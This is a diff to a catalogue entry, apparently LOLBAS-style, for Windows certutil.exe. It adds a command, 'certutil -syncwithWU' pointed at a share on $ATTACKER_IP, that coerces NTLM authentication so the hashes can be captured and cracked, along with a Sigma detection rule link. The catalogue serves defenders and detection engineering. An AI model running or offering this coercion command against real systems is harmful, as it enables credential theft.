@@ -46,6 +46,13 @@ Commands:
     Privileges: User
     MitreID: T1140
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: certutil -syncwithWU  \\$ATTACKER_IP\share
+    Description: Command to coerce NTLM authentication inside Windows
+    Usecase: Coerce NTLM authentication to try to crack Net-NTLMv1 & Net-NTLMv2
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\certutil.exe
   - Path: C:\Windows\SysWOW64\certutil.exe
@@ -55,6 +62,7 @@ Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_download.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/c168a7ad00eee7cebbe7503ca30edea270385bc1/rules/windows/process_creation/proc_creation_win_certutil_ntlm_coercion.yml
   - Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
   - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
   - Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
